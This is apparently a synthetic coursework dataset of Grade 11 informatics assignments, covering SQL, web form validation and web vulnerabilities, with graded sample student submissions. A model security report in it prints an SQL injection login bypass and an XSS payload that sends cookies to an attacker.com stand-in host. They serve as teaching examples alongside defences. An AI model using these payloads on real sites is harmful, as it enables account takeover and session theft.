"""Informatics assignments and submissions for Grade 11 (Standard/General)."""
from coursework_data.rich_content import (
    G11_L1_TEACHER_ATTACHMENT,
    G11_L1_SUBMISSIONS,
)

LESSONS_11 = [
    {
        'grade': 11,
        'lesson': 1,
        'title': 'Кібергігієна та аудит безпеки робочого місця',
        'kind': 'docx',
        'assigned_task': 'Завдання 2 (Практичний чекліст-аудит безпеки робочого місця)',
        'teacher_attachment': G11_L1_TEACHER_ATTACHMENT,
        'description': (
            "Опрацюйте методичні матеріали у прикріпленому файлі «metodychka_kiberbezpeka_audit.docx».\n"
            "До виконання призначено лише завдання 2 (проведення аудиту безпеки робочого місця за чеклістом із виявленням ризиків та рекомендаціями).\n"
            "Інші пункти методички є додатковими і їх письмово виконувати не потрібно.\n"
            "Звіт з аудитом надішліть у файлі Word (.docx)."
        ),
        'custom_criteria': (
            "1. Проведення аудиту за 5 обов'язковими напрямками (ОС, антивірус, паролі, 2FA, бекапи).\n"
            "2. Наявність та повнота зведеної таблиці ризиків та рекомендацій.\n"
            "3. Застосування правила резервного копіювання 3-2-1 та сучасних засобів автентифікації.\n"
            "4. Структурованість та охайність звіту у форматі Word (.docx)."
        ),
        'submissions': G11_L1_SUBMISSIONS,
    },
    {
        'grade': 11,
        'lesson': 2,
        'title': 'Реляційні бази даних: запити JOIN, агрегація та підзапити',
        'kind': 'txt',
        'description': (
            "Тема уроку: Складні запити в мові SQL. Об'єднання таблиць (INNER JOIN, LEFT JOIN), групування з умовами (HAVING), вкладені підзапити (Subqueries).\n"
            "Завдання:\n"
            "Для реляційної бази даних платформи онлайн-навчання ліцею:\n"
            "- `Students(student_id INT, full_name VARCHAR, class_name VARCHAR, city VARCHAR)`\n"
            "- `Courses(course_id INT, title VARCHAR, instructor VARCHAR, price DECIMAL, hours INT)`\n"
            "- `Enrollments(enrollment_id INT, student_id INT, course_id INT, enrolled_date DATE, final_grade INT)`\n\n"
            "Скласти 5 професійних SQL-запитів:\n"
            "1. `INNER JOIN`: Вивести ПІБ учня, клас, назву курсу та підсумкову оцінку (`final_grade`) "
            "для всіх успішно завершених курсів з оцінкою не менше 10 балів.\n"
            "2. `LEFT JOIN` + `IS NULL`: Знайти всіх учнів, які зареєстровані в системі, але ще не записалися на жоден курс.\n"
            "3. Агрегація з фільтрацією груп (`GROUP BY` + `HAVING`): Для кожного курсу підрахувати кількість зареєстрованих учнів "
            "та середній підсумковий бал. Вивести лише ті курси, де навчається щонайменше 3 учні, а середній бал перевищує 8.5.\n"
            "4. Вкладений підзапит (`Subquery` у `WHERE`): Вивести інформацію про курси, ціна яких строго вища за середню ціну всіх курсів у системі.\n"
            "5. Корельований підзапит або підзапит з порівнянням: Знайти учнів, чия підсумкова оцінка вища за середню оцінку на цьому ж конкретному курсі."
        ),
        'custom_criteria': (
            "1. Безпомилковість синтаксису складних конструкцій `INNER JOIN` та `LEFT JOIN`.\n"
            "2. Правильне використання комбінації `LEFT JOIN ... WHERE ... IS NULL` для виявлення розривів зв'язків.\n"
            "3. Точність агрегації `GROUP BY` та фільтрації агрегованих значень через `HAVING` (а не WHERE).\n"
            "4. Коректність використання підзапитів (скалярних та співвіднесених)."
        ),
        'submissions': {
            12: {
                'content': (
                    "Звіт з практичної роботи: Складні аналітичні SQL-запити до навчальної платформи\n"
                    "Автор: Коваль Максим, учень 11-А класу\n\n"
                    "База даних: Students, Courses, Enrollments\n\n"
                    "-- ====================================================================\n"
                    "-- Запит 1: Учні-відмінники та їхні курси (INNER JOIN з фільтрацією)\n"
                    "-- ====================================================================\n"
                    "SELECT \n"
                    "    s.student_id,\n"
                    "    s.full_name AS student_name,\n"
                    "    s.class_name,\n"
                    "    c.title AS course_title,\n"
                    "    e.final_grade\n"
                    "FROM Students s\n"
                    "INNER JOIN Enrollments e ON s.student_id = e.student_id\n"
                    "INNER JOIN Courses c ON e.course_id = c.course_id\n"
                    "WHERE e.final_grade >= 10\n"
                    "ORDER BY e.final_grade DESC, s.full_name ASC;\n\n"
                    "-- ====================================================================\n"
                    "-- Запит 2: Пошук «пасивних» учнів без записів (LEFT JOIN + IS NULL)\n"
                    "-- ====================================================================\n"
                    "SELECT \n"
                    "    s.student_id,\n"
                    "    s.full_name,\n"
                    "    s.class_name,\n"
                    "    s.city\n"
                    "FROM Students s\n"
                    "LEFT JOIN Enrollments e ON s.student_id = e.student_id\n"
                    "WHERE e.enrollment_id IS NULL\n"
                    "ORDER BY s.class_name, s.full_name;\n\n"
                    "-- ====================================================================\n"
                    "-- Запит 3: Популярні та успішні курси (GROUP BY + HAVING)\n"
                    "-- ====================================================================\n"
                    "SELECT \n"
                    "    c.course_id,\n"
                    "    c.title AS course_title,\n"
                    "    c.instructor,\n"
                    "    COUNT(e.student_id) AS total_students,\n"
                    "    ROUND(AVG(e.final_grade), 2) AS avg_course_grade\n"
                    "FROM Courses c\n"
                    "INNER JOIN Enrollments e ON c.course_id = e.course_id\n"
                    "GROUP BY c.course_id, c.title, c.instructor\n"
                    "HAVING COUNT(e.student_id) >= 3 \n"
                    "   AND AVG(e.final_grade) > 8.5\n"
                    "ORDER BY avg_course_grade DESC;\n\n"
                    "-- ====================================================================\n"
                    "-- Запит 4: Курси дорожчі за середньоринкову ціну (Вкладений підзапит)\n"
                    "-- ====================================================================\n"
                    "SELECT \n"
                    "    course_id,\n"
                    "    title,\n"
                    "    price,\n"
                    "    hours\n"
                    "FROM Courses\n"
                    "WHERE price > (\n"
                    "    SELECT AVG(price) FROM Courses\n"
                    ")\n"
                    "ORDER BY price DESC;\n\n"
                    "-- ====================================================================\n"
                    "-- Запит 5: Учні з балом вище середнього по даному курсу (Корельований підзапит)\n"
                    "-- ====================================================================\n"
                    "SELECT \n"
                    "    s.full_name,\n"
                    "    c.title AS course_title,\n"
                    "    e1.final_grade\n"
                    "FROM Enrollments e1\n"
                    "JOIN Students s ON e1.student_id = s.student_id\n"
                    "JOIN Courses c ON e1.course_id = c.course_id\n"
                    "WHERE e1.final_grade > (\n"
                    "    SELECT AVG(e2.final_grade)\n"
                    "    FROM Enrollments e2\n"
                    "    WHERE e2.course_id = e1.course_id\n"
                    ")\n"
                    "ORDER BY c.title, e1.final_grade DESC;\n"
                ),
                'comment_student': "Доброго дня! Склав усі 5 складних SQL-запитів: множинні JOIN, перевірка IS NULL, HAVING для фільтрації агрегованих груп та корельований підзапит у запиті 5.",
                'rationale': "Високий рівень (12 балів). Вища категорія володіння SQL: ідеальне поєднання операторів `INNER/LEFT JOIN`, коректне використання `HAVING` замість типової помилки з `WHERE`, складний корельований підзапит для порівняння з внутрішнім середнім курсу.",
                'gaps': [],
            },
            10: {
                'content': (
                    "Складні SQL запити\n"
                    "Виконала: Мельник Софія, 11-А клас\n\n"
                    "-- 1. Відмінники на курсах\n"
                    "SELECT s.full_name, c.title, e.final_grade\n"
                    "FROM Students s\n"
                    "JOIN Enrollments e ON s.student_id = e.student_id\n"
                    "JOIN Courses c ON e.course_id = c.course_id\n"
                    "WHERE e.final_grade >= 10;\n\n"
                    "-- 2. Учні без курсів\n"
                    "SELECT s.full_name, s.class_name\n"
                    "FROM Students s\n"
                    "LEFT JOIN Enrollments e ON s.student_id = e.student_id\n"
                    "WHERE e.course_id IS NULL;\n\n"
                    "-- 3. Курси від 3 учнів з середнім балом > 8.5\n"
                    "SELECT c.title, COUNT(e.student_id) AS st_count, AVG(e.final_grade) AS avg_mark\n"
                    "FROM Courses c\n"
                    "JOIN Enrollments e ON c.course_id = e.course_id\n"
                    "GROUP BY c.title\n"
                    "HAVING COUNT(e.student_id) >= 3 AND AVG(e.final_grade) > 8.5;\n\n"
                    "-- 4. Курси дорожчі за середнє\n"
                    "SELECT title, price FROM Courses\n"
                    "WHERE price > (SELECT AVG(price) FROM Courses);\n\n"
                    "-- 5. Учні з оцінкою вище загального середнього\n"
                    "SELECT s.full_name, e.final_grade\n"
                    "FROM Students s\n"
                    "JOIN Enrollments e ON s.student_id = e.student_id\n"
                    "WHERE e.final_grade > (SELECT AVG(final_grade) FROM Enrollments);\n"
                ),
                'comment_student': "Здала практичну роботу зі складними SQL запитами.",
                'rationale': "Високий рівень (10 балів). Перші 4 запити бездоганні (JOIN, LEFT JOIN IS NULL, HAVING, Subquery). У 5-му запиті учень порахував середнє по всій системі загалом замість корельованого підзапиту для конкретного курсу.",
                'gaps': ["У запиті 5 порівняння виконано з глобальним середнім замість середнього по курсу."],
            },
            7: {
                'content': (
                    "Практична: SQL запити\n"
                    "Ткаченко Марія, 11-А\n\n"
                    "1) SELECT s.full_name, c.title, e.final_grade \n"
                    "   FROM Students s, Courses c, Enrollments e \n"
                    "   WHERE s.student_id = e.student_id AND c.course_id = e.course_id AND e.final_grade >= 10;\n\n"
                    "2) SELECT s.full_name FROM Students s \n"
                    "   LEFT JOIN Enrollments e ON s.student_id = e.student_id \n"
                    "   WHERE e.enrollment_id IS NULL;\n\n"
                    "3) SELECT c.title, AVG(e.final_grade) \n"
                    "   FROM Courses c JOIN Enrollments e ON c.course_id = e.course_id \n"
                    "   GROUP BY c.title;\n\n"
                    "4) SELECT * FROM Courses WHERE price > (SELECT AVG(price) FROM Courses);\n"
                ),
                'comment_student': "Завдання виконала.",
                'rationale': "Достатній рівень (7 балів). Запити 2 і 4 написані правильно. Але: у запиті 1 використано застарілий неявний синтаксис з коми у FROM замість явного `INNER JOIN`; у запиті 3 пропущено фільтрацію `HAVING`; запит 5 не виконано.",
                'gaps': ["Неявний JOIN у запиті 1.", "Пропущено умову HAVING у запиті 3.", "Запит 5 пропущено."],
            },
            5: {
                'content': (
                    "SQL\n"
                    "Шевченко Данило\n\n"
                    "1) SELECT * FROM Students JOIN Courses ON Students.student_id = Courses.course_id\n"
                    "2) SELECT * FROM Courses WHERE price > 1000\n"
                ),
                'comment_student': "здав роботу",
                'rationale': "Середній рівень (5 балів). Груба логічна помилка у першому запиті: `student_id` безпосередньо об'єднано з `course_id` (зв'язок неіснуючий, оскільки зв'язок реалізується через `Enrollments`), підзапити, HAVING та LEFT JOIN відсутні.",
                'gaps': ["Помилкове об'єднання student_id з course_id.", "Запити 2, 3, 4, 5 не реалізовані."],
            },
            4: {
                'content': (
                    "SELECT JOIN FROM database WHERE grade > 10\n"
                ),
                'comment_student': "здав",
                'rationale': "Початковий рівень (4 бали). Синтаксично беззмістовний набір ключових слів, завдання не виконане.",
                'gaps': ["Некоректний синтаксис SQL."],
            },
        },
    },
    {
        'grade': 11,
        'lesson': 3,
        'title': 'Вебтехнології: клієнтська та серверна валідація реєстраційних форм',
        'kind': 'html',
        'description': (
            "Тема уроку: Веброзробка. Інтерактивні форми, DOM, валідація даних засобами HTML5 та JavaScript. Принципи клієнт-серверної безпеки.\n"
            "Завдання:\n"
            "Створити вебформу онлайн-реєстрації учасників Всеукраїнського турніру з програмування.\n"
            "Вимоги до форми та скрипта:\n"
            "1. Поля введення: ПІБ учасника, Вік (число від 14 до 18 років), Електронна пошта, Назва навчального закладу, "
            "Вибір мови програмування (`<select>`: Python, C++, Java), чекбокс згоди з регламентом змагань (`required`).\n"
            "2. Клієнтська валідація засобами JavaScript:\n"
            "   - динамічна перевірка при спробі відправки форми `addEventListener('submit', ...)`;\n"
            "   - скасування стандартної відправки `event.preventDefault()` у разі наявності помилок;\n"
            "   - виведення червоного повідомлення про помилку безпосередньо під проблемним полем (а не через `alert`);\n"
            "   - блокування кнопки відправки («Зачекайте...») під час імітації успішного надсилання.\n"
            "3. Короткий теоретичний коментар (1-2 абзаци): чому валідація на стороні клієнта (у браузері) є виключно "
            "інструментом зручності інтерфейсу (UX), а справжня безпека та захист від зловмисників вимагають обов'язкової серверної валідації."
        ),
        'custom_criteria': (
            "1. Семантична правильність побудови форми та прив'язка `<label for=\"...\">` до полів.\n"
            "2. Грамотність реалізації JavaScript-валідації через слухач події `submit` та маніпуляції з DOM.\n"
            "3. Візуальне виведення помилок під полями та блокування повторної відправки кнопки.\n"
            "4. Глибина теоретичного пояснення різниці між клієнтською та серверною валідацією."
        ),
        'submissions': {
            12: {
                'content': (
                    "<!DOCTYPE html>\n<html lang=\"uk\">\n<head>\n"
                    "    <meta charset=\"UTF-8\">\n"
                    "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
                    "    <title>Реєстрація: Всеукраїнський турнір юних програмістів</title>\n"
                    "    <style>\n"
                    "        body {\n"
                    "            font-family: 'Segoe UI', system-ui, sans-serif;\n"
                    "            background: #f1f5f9;\n"
                    "            color: #1e293b;\n"
                    "            padding: 30px 15px;\n"
                    "            display: flex;\n"
                    "            justify-content: center;\n"
                    "        }\n"
                    "        .card {\n"
                    "            background: white;\n"
                    "            max-width: 600px;\n"
                    "            width: 100%;\n"
                    "            padding: 35px;\n"
                    "            border-radius: 12px;\n"
                    "            box-shadow: 0 4px 20px rgba(0,0,0,0.08);\n"
                    "        }\n"
                    "        h2 { color: #1e40af; margin-bottom: 5px; text-align: center; }\n"
                    "        p.sub { text-align: center; color: #64748b; font-size: 14px; margin-bottom: 25px; }\n"
                    "        .form-group {\n"
                    "            margin-bottom: 18px;\n"
                    "            display: flex;\n"
                    "            flex-direction: column;\n"
                    "        }\n"
                    "        label { font-weight: 600; font-size: 14px; margin-bottom: 5px; }\n"
                    "        input[type=\"text\"], input[type=\"email\"], input[type=\"number\"], select {\n"
                    "            padding: 10px 12px;\n"
                    "            border: 1px solid #cbd5e1;\n"
                    "            border-radius: 6px;\n"
                    "            font-size: 14px;\n"
                    "            transition: border-color 0.2s;\n"
                    "        }\n"
                    "        input.invalid, select.invalid { border-color: #ef4444; background: #fff5f5; }\n"
                    "        .error-msg {\n"
                    "            color: #dc2626;\n"
                    "            font-size: 12px;\n"
                    "            margin-top: 4px;\n"
                    "            min-height: 16px;\n"
                    "        }\n"
                    "        .checkbox-group {\n"
                    "            flex-direction: row;\n"
                    "            align-items: center;\n"
                    "            gap: 10px;\n"
                    "            margin-top: 10px;\n"
                    "        }\n"
                    "        button.submit-btn {\n"
                    "            width: 100%;\n"
                    "            background: #2563eb;\n"
                    "            color: white;\n"
                    "            border: none;\n"
                    "            padding: 12px;\n"
                    "            font-size: 16px;\n"
                    "            font-weight: bold;\n"
                    "            border-radius: 6px;\n"
                    "            cursor: pointer;\n"
                    "            margin-top: 15px;\n"
                    "        }\n"
                    "        button.submit-btn:disabled { background: #94a3b8; cursor: not-allowed; }\n"
                    "        .theory-box {\n"
                    "            background: #f8fafc;\n"
                    "            border: 1px solid #e2e8f0;\n"
                    "            padding: 15px;\n"
                    "            border-radius: 8px;\n"
                    "            margin-top: 25px;\n"
                    "            font-size: 13px;\n"
                    "            line-height: 1.6;\n"
                    "            color: #334155;\n"
                    "        }\n"
                    "    </style>\n</head>\n<body>\n"
                    "    <div class=\"card\">\n"
                    "        <h2>Реєстрація учасника турніру</h2>\n"
                    "        <p class=\"sub\">Всеукраїнські учнівські змагання з алгоритмічного програмування</p>\n"
                    "        \n"
                    "        <form id=\"regForm\" novalidate>\n"
                    "            <div class=\"form-group\">\n"
                    "                <label for=\"fullName\">ПІБ учасника:</label>\n"
                    "                <input type=\"text\" id=\"fullName\" placeholder=\"Шевченко Данило Сергійович\">\n"
                    "                <span class=\"error-msg\" id=\"nameError\"></span>\n"
                    "            </div>\n"
                    "            \n"
                    "            <div class=\"form-group\">\n"
                    "                <label for=\"age\">Вік (повних років, 14–18):</label>\n"
                    "                <input type=\"number\" id=\"age\" min=\"14\" max=\"18\" placeholder=\"16\">\n"
                    "                <span class=\"error-msg\" id=\"ageError\"></span>\n"
                    "            </div>\n"
                    "            \n"
                    "            <div class=\"form-group\">\n"
                    "                <label for=\"email\">Електронна пошта:</label>\n"
                    "                <input type=\"email\" id=\"email\" placeholder=\"student@example.ua\">\n"
                    "                <span class=\"error-msg\" id=\"emailError\"></span>\n"
                    "            </div>\n"
                    "            \n"
                    "            <div class=\"form-group\">\n"
                    "                <label for=\"lang\">Основна мова змагань:</label>\n"
                    "                <select id=\"lang\">\n"
                    "                    <option value=\"\">-- Оберіть мову --</option>\n"
                    "                    <option value=\"py\">Python 3</option>\n"
                    "                    <option value=\"cpp\">C++ (GCC 13)</option>\n"
                    "                    <option value=\"java\">Java 21</option>\n"
                    "                </select>\n"
                    "                <span class=\"error-msg\" id=\"langError\"></span>\n"
                    "            </div>\n"
                    "            \n"
                    "            <div class=\"form-group checkbox-group\">\n"
                    "                <input type=\"checkbox\" id=\"agree\">\n"
                    "                <label for=\"agree\" style=\"font-weight: normal; margin-bottom: 0;\">Погоджуюся з регламентом проведення та обробкою персональних даних</label>\n"
                    "            </div>\n"
                    "            <span class=\"error-msg\" id=\"agreeError\"></span>\n"
                    "            \n"
                    "            <button type=\"submit\" id=\"submitBtn\" class=\"submit-btn\">Зареєструватися</button>\n"
                    "        </form>\n"
                    "        \n"
                    "        <div class=\"theory-box\">\n"
                    "            <strong>Чому клієнтської валідації недостатньо для безпеки?</strong><br>\n"
                    "            Клієнтська валідація (JavaScript + HTML5) виконується безпосередньо у браузері користувача. Вона створена виключно "
                    "для покращення користувацького досвіду (UX): миттєво підказати про пропущене поле або неправильний формат без очікування "
                    "відповіді сервера. Проте зловмисник може легко відключити JavaScript у налаштуваннях браузера або надіслати підроблений "
                    "HTTP POST-запит напряму через консоль розробника, Python-скрипт чи Postman. Тільки обов'язкова серверна перевірка "
                    "на бекенді (Django, Node.js тощо) гарантує безпеку бази даних від SQL-ін'єкцій та переповнення буфера.\n"
                    "        </div>\n"
                    "    </div>\n"
                    "    \n"
                    "    <script>\n"
                    "        document.getElementById('regForm').addEventListener('submit', function(event) {\n"
                    "            event.preventDefault(); // Скасування стандартної відправки\n"
                    "            \n"
                    "            let isValid = true;\n"
                    "            \n"
                    "            // 1. Валідація ПІБ\n"
                    "            const name = document.getElementById('fullName');\n"
                    "            const nameErr = document.getElementById('nameError');\n"
                    "            if (name.value.trim().split(' ').length < 2) {\n"
                    "                name.classList.add('invalid');\n"
                    "                nameErr.textContent = \"Вкажіть прізвище та ім'я через пробіл\";\n"
                    "                isValid = false;\n"
                    "            } else {\n"
                    "                name.classList.remove('invalid');\n"
                    "                nameErr.textContent = \"\";\n"
                    "            }\n"
                    "            \n"
                    "            // 2. Валідація віку (14 - 18 років)\n"
                    "            const age = document.getElementById('age');\n"
                    "            const ageErr = document.getElementById('ageError');\n"
                    "            const ageVal = parseInt(age.value, 10);\n"
                    "            if (isNaN(ageVal) || ageVal < 14 || ageVal > 18) {\n"
                    "                age.classList.add('invalid');\n"
                    "                ageErr.textContent = \"Вік учасника турніру має бути від 14 до 18 років\";\n"
                    "                isValid = false;\n"
                    "            } else {\n"
                    "                age.classList.remove('invalid');\n"
                    "                ageErr.textContent = \"\";\n"
                    "            }\n"
                    "            \n"
                    "            // 3. Валідація Email\n"
                    "            const email = document.getElementById('email');\n"
                    "            const emailErr = document.getElementById('emailError');\n"
                    "            const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n"
                    "            if (!emailRegex.test(email.value.trim())) {\n"
                    "                email.classList.add('invalid');\n"
                    "                emailErr.textContent = \"Введіть дійсний формат адреси електронної пошти\";\n"
                    "                isValid = false;\n"
                    "            } else {\n"
                    "                email.classList.remove('invalid');\n"
                    "                emailErr.textContent = \"\";\n"
                    "            }\n"
                    "            \n"
                    "            // 4. Валідація мови\n"
                    "            const lang = document.getElementById('lang');\n"
                    "            const langErr = document.getElementById('langError');\n"
                    "            if (lang.value === \"\") {\n"
                    "                lang.classList.add('invalid');\n"
                    "                langErr.textContent = \"Будь ласка, оберіть мову змагань зі списку\";\n"
                    "                isValid = false;\n"
                    "            } else {\n"
                    "                lang.classList.remove('invalid');\n"
                    "                langErr.textContent = \"\";\n"
                    "            }\n"
                    "            \n"
                    "            // 5. Валідація чекбоксу\n"
                    "            const agree = document.getElementById('agree');\n"
                    "            const agreeErr = document.getElementById('agreeError');\n"
                    "            if (!agree.checked) {\n"
                    "                agreeErr.textContent = \"Необхідно підтвердити згоду з регламентом\";\n"
                    "                isValid = false;\n"
                    "            } else {\n"
                    "                agreeErr.textContent = \"\";\n"
                    "            }\n"
                    "            \n"
                    "            // Якщо форма валідна\n"
                    "            if (isValid) {\n"
                    "                const btn = document.getElementById('submitBtn');\n"
                    "                btn.disabled = true;\n"
                    "                btn.textContent = \"Успішно зареєстровано! Відправка...\";\n"
                    "                btn.style.background = \"#16a34a\";\n"
                    "            }\n"
                    "        });\n"
                    "    </script>\n</body>\n</html>"
                ),
                'comment_student': "Доброго дня! Реалізувала повнофункціональну реєстраційну форму на HTML5 з JS-валідацією подій submit, динамічними спанами помилок, блокуванням кнопки та теоретичним поясненням серверної безпеки.",
                'rationale': "Високий рівень (12 балів). Вищий пілотаж вебпрограмування: семантична доступність, правильний обробник `addEventListener` з `event.preventDefault()`, індивідуальні блоки помилок, деактивація кнопки та бездоганний аналіз меж клієнтської валідації.",
                'gaps': [],
            },
            10: {
                'content': (
                    "<!DOCTYPE html>\n<html lang=\"uk\">\n<head>\n"
                    "    <meta charset=\"UTF-8\">\n"
                    "    <title>Форма реєстрації</title>\n"
                    "    <style>\n"
                    "        body { font-family: Arial, sans-serif; padding: 20px; background: #f8fafc; }\n"
                    "        .box { background: white; padding: 25px; max-width: 500px; margin: auto; border-radius: 8px; }\n"
                    "        .field { margin-bottom: 12px; }\n"
                    "        input, select { width: 100%; padding: 8px; box-sizing: border-box; }\n"
                    "        .err { color: red; font-size: 12px; }\n"
                    "        button { background: blue; color: white; padding: 10px; border: none; width: 100%; border-radius: 4px; }\n"
                    "    </style>\n</head>\n<body>\n"
                    "    <div class=\"box\">\n"
                    "        <h2>Реєстрація на турнір</h2>\n"
                    "        <form id=\"myForm\">\n"
                    "            <div class=\"field\">\n"
                    "                ПІБ: <input type=\"text\" id=\"uName\">\n"
                    "                <div id=\"eName\" class=\"err\"></div>\n"
                    "            </div>\n"
                    "            <div class=\"field\">\n"
                    "                Вік: <input type=\"number\" id=\"uAge\">\n"
                    "                <div id=\"eAge\" class=\"err\"></div>\n"
                    "            </div>\n"
                    "            <div class=\"field\">\n"
                    "                Email: <input type=\"email\" id=\"uEmail\">\n"
                    "                <div id=\"eEmail\" class=\"err\"></div>\n"
                    "            </div>\n"
                    "            <div class=\"field\">\n"
                    "                Мова:\n"
                    "                <select id=\"uLang\">\n"
                    "                    <option value=\"\">Оберіть мову</option>\n"
                    "                    <option value=\"py\">Python</option>\n"
                    "                    <option value=\"cpp\">C++</option>\n"
                    "                </select>\n"
                    "                <div id=\"eLang\" class=\"err\"></div>\n"
                    "            </div>\n"
                    "            <button type=\"submit\" id=\"btn\">Надіслати</button>\n"
                    "        </form>\n"
                    "        <p><strong>Теорія:</strong> Клієнтська валідація зручна для користувача, але хакер може відправити запит в обхід браузера, тому сервер повинен обов'язково перевіряти все повторно.</p>\n"
                    "    </div>\n"
                    "    <script>\n"
                    "        document.getElementById('myForm').onsubmit = function(e) {\n"
                    "            e.preventDefault();\n"
                    "            let ok = true;\n"
                    "            if (document.getElementById('uName').value.trim() === '') {\n"
                    "                document.getElementById('eName').innerText = 'Введіть ім\\'я';\n"
                    "                ok = false;\n"
                    "            } else { document.getElementById('eName').innerText = ''; }\n"
                    "            let a = parseInt(document.getElementById('uAge').value);\n"
                    "            if (isNaN(a) || a < 14 || a > 18) {\n"
                    "                document.getElementById('eAge').innerText = 'Вік 14-18';\n"
                    "                ok = false;\n"
                    "            } else { document.getElementById('eAge').innerText = ''; }\n"
                    "            if (ok) {\n"
                    "                alert('Успішно!');\n"
                    "            }\n"
                    "        };\n"
                    "    </script>\n</body>\n</html>"
                ),
                'comment_student': "Здав форму з JS валідацією.",
                'rationale': "Високий рівень (10 балів). Форма працює, валідація через JS присутня, помилки виводяться в DOM, теоретичне пояснення правильне. Чекбокс згоди відсутній, замість блокування кнопки використано alert.",
                'gaps': ["Не реалізовано чекбокс згоди.", "Замість деактивації кнопки викликається alert()."],
            },
            7: {
                'content': (
                    "<!DOCTYPE html>\n<html>\n<head><title>Форма</title></head>\n<body>\n"
                    "    <h2>Реєстрація</h2>\n"
                    "    <form action=\"#\">\n"
                    "        Ім'я: <input type=\"text\" required><br><br>\n"
                    "        Вік: <input type=\"number\" min=\"14\" max=\"18\" required><br><br>\n"
                    "        Email: <input type=\"email\" required><br><br>\n"
                    "        Мова: <select required><option value=\"1\">Python</option></select><br><br>\n"
                    "        <input type=\"submit\" value=\"Зареєструватися\">\n"
                    "    </form>\n"
                    "    <p>Серверна перевірка потрібна бо сайт можуть зламати.</p>\n"
                    "</body>\n</html>"
                ),
                'comment_student': "Завдання виконала.",
                'rationale': "Достатній рівень (7 балів). Форма створена, стандартні атрибути HTML5 (`required, min, max, type='email'`) налаштовані правильно. Проте повністю відсутній JavaScript-код валідації через `submit`, відсутні стилі, теорія зведена до одного загального речення.",
                'gaps': ["Повністю відсутній JavaScript-скрипт валідації.", "Немає стилізації CSS."],
            },
            5: {
                'content': (
                    "<html><body>\n"
                    "<form>\n"
                    "Ім'я: <input type=\"text\"><br>\n"
                    "Вік: <input type=\"text\"><br>\n"
                    "<button onclick=\"alert('Відправлено')\">Ок</button>\n"
                    "</form>\n"
                    "</body></html>"
                ),
                'comment_student': "моя форма",
                'rationale': "Середній рівень (5 балів). Валідація відсутня (можна відправити абсолютно порожні поля), тип поля віку текстовий, форма виводить фіктивний alert без жодної перевірки.",
                'gaps': ["Валідація відсутня.", "Порожні поля не блокуються."],
            },
            4: {
                'content': (
                    "<form><input type=\"text\"></form>\n"
                ),
                'comment_student': "здав",
                'rationale': "Початковий рівень (4 бали). Одне порожнє поле введення, форма не завершена, завдання не виконано.",
                'gaps': ["Форма не містить необхідних полів та валідації."],
            },
        },
    },
    {
        'grade': 11,
        'lesson': 4,
        'title': 'Кібербезпека: вебвразливості (SQLi, XSS, CSRF) та методи захисту',
        'kind': 'txt',
        'description': (
            "Тема уроку: Безпека вебзастосунків (OWASP Top 10). Аналіз критичних вразливостей: SQL Injection, XSS, CSRF.\n"
            "Завдання:\n"
            "Підготувати структурований аналітичний звіт з кібербезпеки для шкільних веброзробників.\n"
            "У звіті необхідно детально розібрати три типи вразливостей:\n"
            "1. SQL Injection (SQL-ін'єкція):\n"
            "   - навести приклад небезпечного фрагмента коду з конкатенацією рядків запиту (`f\"SELECT * FROM users WHERE login='{login}'...\"`);\n"
            "   - показати, що станеться, якщо зловмисник введе `' OR '1'='1`;\n"
            "   - навести безпечний код із використанням параметризованих (підготовлених) запитів (`Prepared Statements` або ORM).\n"
            "2. Cross-Site Scripting (XSS — міжсайтовий скриптинг):\n"
            "   - пояснити різницю між збереженим (Stored) та відображеним (Reflected) XSS;\n"
            "   - показати, як зловмисник може вкрасти Cookie (сесію) через введений тег `<script>`;\n"
            "   - описати захисні заходи (екранування символів HTML Entities, прапорець `HttpOnly`, політика CSP).\n"
            "3. Cross-Site Request Forgery (CSRF — міжсайтова підробка запитів):\n"
            "   - описати сценарій атаки, коли авторизований користувач переходить за шкідливим посиланням і виконує небажану дію;\n"
            "   - пояснити механізм захисту за допомогою CSRF-токенів (`{% csrf_token %}` у Django) та атрибуту `SameSite` у Cookie."
        ),
        'custom_criteria': (
            "1. Технічна точність навчальних прикладів вразливого та виправленого коду SQL.\n"
            "2. Розуміння механізму виконання чужого JavaScript при XSS та методів екранування/санітизації.\n"
            "3. Чітке пояснення принципу дії та необхідності одноразових CSRF-токенів.\n"
            "4. Комплексність та практична цінність рекомендацій з безпеки вебсервісів."
        ),
        'submissions': {
            12: {
                'content': (
                    "Аналітичний звіт: Дослідження критичних вебвразливостей OWASP Top 10 та методи захисту\n"
                    "Автор: Мельник Софія, учениця 11-А класу\n\n"
                    "====================================================================\n"
                    "1. SQL INJECTION (SQL-ін'єкція)\n"
                    "====================================================================\n"
                    "Механізм атаки:\n"
                    "Виникає тоді, коли неперевірені дані від користувача вставляються прямо в тіло SQL-команди через конкатенацію рядків.\n"
                    "• Вразливий код (Python):\n"
                    "  query = f\"SELECT * FROM Users WHERE username='{user_input}' AND password='{pwd_input}'\"\n"
                    "  cursor.execute(query)\n\n"
                    "Вектор атаки:\n"
                    "Зловмисник у поле логіна вводить: admin' --\n"
                    "Запит перетворюється на:\n"
                    "  SELECT * FROM Users WHERE username='admin' --' AND password='...'\n"
                    "Символи «--» закоментовують усю перевірку пароля, і хакер отримує повний доступ до адмін-панелі без знання пароля!\n\n"
                    "• Надійний метод захисту: Параметризовані підготовлені запити (Prepared Statements)\n"
                    "  query = \"SELECT * FROM Users WHERE username = %s AND password_hash = %s\"\n"
                    "  cursor.execute(query, (user_input, pwd_input))\n"
                    "СУБД спочатку компілює структуру SQL-команди, а вхідні параметри передає суворо як дані, де будь-які лапки сприймаються як звичайний текст, що робить ін'єкцію технічно неможливою.\n\n"
                    "====================================================================\n"
                    "2. CROSS-SITE SCRIPTING (XSS — міжсайтовий скриптинг)\n"
                    "====================================================================\n"
                    "Механізм атаки:\n"
                    "Впровадження шкідливого JavaScript-коду на сторінку сайту, який потім виконується в браузерах інших відвідувачів.\n"
                    "- Stored XSS (Постійний): скрипт зберігається в базі даних (наприклад, у коментарі до статті) і завантажується всім читачам.\n"
                    "- Reflected XSS (Відображений): скрипт міститься в URL-параметрі пошукового запиту та миттєво відбивається у відповіді сервера.\n\n"
                    "Вектор загрози: Крадіжка сесії (Cookie):\n"
                    "Коментар з кодом: <script>fetch('http://attacker.com/steal?c=' + document.cookie);</script>\n"
                    "Якщо цей скрипт виконається, хакер отримає сесійний ідентифікатор і увійде в акаунт жертви.\n\n"
                    "Методи захисту:\n"
                    "1. Екранування HTML Entities: автоматичне перетворення «<» на «&lt;», «>» на «&gt;» (шаблонізатори Django та Jinja роблять це за замовчуванням);\n"
